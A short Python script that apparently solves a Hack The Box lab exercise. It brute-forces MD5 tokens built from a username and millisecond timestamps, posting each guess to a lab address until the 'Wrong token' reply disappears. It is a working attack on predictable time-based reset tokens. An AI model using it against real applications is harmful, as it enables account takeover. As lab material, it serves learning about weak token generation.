import datetime
import time
from hashlib import md5
import os
import requests

date_time = '2022-12-20 10:54:11am'
pattern = '%Y-%m-%d %I:%M:%S%p'

# %I is 12-hours format whereas %H is 24hours format

date_object=datetime.datetime.strptime(date_time,pattern)
print(date_object)

epoch=int((date_object.replace(tzinfo=datetime.timezone.utc).timestamp())*1000)
print(epoch)

x = "htbuser" + str(epoch)
print(x)

md5_token = md5(str(x).encode()).hexdigest()
print(md5_token)

#---------------------------for HTB ---------------------------------
print("--------------------------------------")

url = "http://167.71.141.57:31320/question1/"
fail_text  = "Wrong token"


start=epoch-1000
end=epoch+1000

for i in range(start,end+1): # token generated within a second
    token_str="htbadmin" + str(i)
    md5_token=md5(token_str.encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(token_str), md5_token))

    # send the request
    res = requests.post(url, data=data, allow_redirects=False)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()


